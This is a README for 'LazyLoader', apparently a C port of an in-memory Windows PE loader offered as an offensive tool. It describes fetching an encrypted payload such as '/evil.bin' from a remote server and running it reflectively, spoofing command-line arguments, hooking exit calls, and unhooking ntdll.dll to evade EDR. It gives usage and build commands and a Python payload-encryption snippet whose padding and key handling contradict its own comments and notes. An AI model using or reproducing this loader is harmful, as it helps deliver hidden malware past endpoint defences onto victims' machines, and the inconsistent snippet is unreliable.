## 🧩 Overview
LazyLoader is a sophisticated, in-memory Windows PE (Portable Executable) loader that:

- Downloads an AES-256 encrypted PE file and its decryption key from a remote HTTP server.
- Decrypts the payload in memory using Windows CryptoAPI.
- Reflectively maps and relocates the PE into the current process.
- Repairs the Import Address Table (IAT) with optional API hooking to spoof command-line arguments and prevent process exit.
- Executes the payload in a new thread.
- Optionally unhooks ntdll.dll by restoring its .text section from a clean process (e.g., notepad.exe) to evade EDR/userland hooks.
- Designed for stealth, LazyLoader leaves no trace on disk and hides its execution context from command-line inspection tools.

## ⚙️ Features
- ✅ Remote Payload Fetching
Uses WinHTTP to securely download encrypted PE and key files from a remote server.

## ✅ AES-256 Decryption
- Leverages Windows CryptAcquireContext, CryptCreateHash, and CryptDecrypt for secure in-memory decryption.

## ✅ Reflective PE Loading

- Parses PE headers and sections.
- Allocates memory at preferred or relocated base.
- Copies headers and sections.
- Repairs IAT with dynamic GetProcAddress.

## ✅ Command-Line Masquerading
Spoofs:

- GetCommandLineA/W
- __p___argv
- __p___wargv
- __p___argc
- __getmainargs
- __wgetmainargs

Prevents detection via process argument inspection.

- ✅ **Exit Function Hooking**
Hooks exit, _exit, ExitProcess, etc., to redirect termination to ExitThread(0) — keeping the host process alive.

- ✅ **EDR Evasion via NTDLL Unhooking**
Optionally spawns a suspended notepad.exe, reads clean ntdll.dll from its memory, and restores hooked .text sections in the current process.

- ✅ **No Disk Artifacts**
Everything runs in memory — no temporary files written.

## 🚀 Usage
```cmd
LazyLoader.exe <Host> <Port> <EncryptedPEPath> <KeyPath>
```
### Example
```cmd
LazyLoader.exe 192.168.1.100 8080 /evil.bin /key.bin
```
### This will:

- Connect to http://192.168.1.100:8080/evil.bin and download the encrypted payload.
- Download the key from http://192.168.1.100:8080/key.bin.
- Decrypt the payload using AES-256.
- Spoof command-line to appear as "whatEver".
- Load and execute the PE reflectively.

## 🔐 Encryption Requirements
The payload must be encrypted with AES-256 in ECB mode (or compatible with Windows CryptDecrypt defaults).

Example Python encryption snippet:

```python
from Crypto.Cipher import AES
import hashlib

key = b"your-32-byte-key-here-------------"  # Must be 32 bytes
data = open("payload.bin", "rb").read()
cipher = AES.new(key, AES.MODE_ECB)
encrypted = cipher.encrypt(data.ljust((len(data) // 16 + 1) * 16, b'\x00'))  # PKCS#7-style padding

with open("evil.bin", "wb") as f:
    f.write(encrypted)
```
## 🔍 Notes: 
- LazyLoader uses SHA-256 to hash the key file contents before deriving the AES key — ensure your encryption matches this behavior.
- I only translate to C from C++ ( https://github.com/d1rkmtrr/FilelessPELoader/ ), because i like more C xd, and to learn, and this version compile in linux :D

## 🧪 Compilation
Requirements
x86_64-w64-mingw32-gcc
Libraries: WinHttp, Crypt32, Psapi
Build with x86_64-w64-mingw32-gcc
cmd

x86_64-w64-mingw32-gcc -o loader.exe main.c -lwinhttp -lcrypt32 -lpsapi 

## 🛡️ Detection Evasion Techniques

### LoadLibrary
— avoids module enumeration.
IAT Repair + Hooking
Spoofs command-line and argv to hide true intent.
Exit Hooking
Redirects
ExitProcess
to
ExitThread
— host process stays alive.
NTDLL Unhooking
Restores clean
.text
from external process — defeats userland hooks.
No Disk Writes
Entire execution is memory-resident.
